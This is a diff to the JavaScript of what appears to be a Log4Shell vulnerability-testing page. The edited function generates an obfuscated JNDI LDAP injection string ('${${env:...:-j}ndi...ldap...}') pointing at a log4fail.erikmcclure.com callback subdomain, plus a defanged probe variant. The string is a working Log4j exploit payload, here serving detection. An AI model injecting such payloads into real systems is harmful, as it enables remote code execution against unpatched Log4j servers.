@@ -326,21 +326,23 @@
       r.send();
       setTimeout(update, 5000);
     }
-    function prepwindow(cv) {
+    function prepwindow(cvpair) {
       waiter.classList = 'hidden';
       generator.classList = 'hidden';
       helper.classList = '';
       tracker.classList = '';
-      code = cv;
-      document.getElementById("url").innerHTML = code;
+      cv = cvpair.split(",");
+      code = cv[0];
+      document.getElementById("url").innerHTML = cv[0];
       var envname = '';
       var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
       for (var i = 0; i < 9; i++) {
         envname += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
       }
 
-      document.getElementById("injector").innerHTML = "${${env:" + envname + ":-j}ndi${env:" + envname + ":-:}${env:" + envname + ":-l}dap${env:" + envname + ":-:}//" + code + ".log4fail.erikmcclure.com/a}"
-      document.getElementById("probe").innerHTML = document.getElementById("injector").innerHTML.replaceAll('$', '.');
+      var prefix = "${${env:" + envname + ":-j}ndi${env:" + envname + ":-:}${env:" + envname + ":-l}dap${env:" + envname + ":-:}//";
+      document.getElementById("injector").innerHTML = prefix + cv[0] + ".log4fail.erikmcclure.com/a}"
+      document.getElementById("probe").innerHTML = prefix.replaceAll('$', '.') + cv[1] + ".log4fail.erikmcclure.com/a}";
       setTimeout(update, 5000);
     }
     function gennew() {
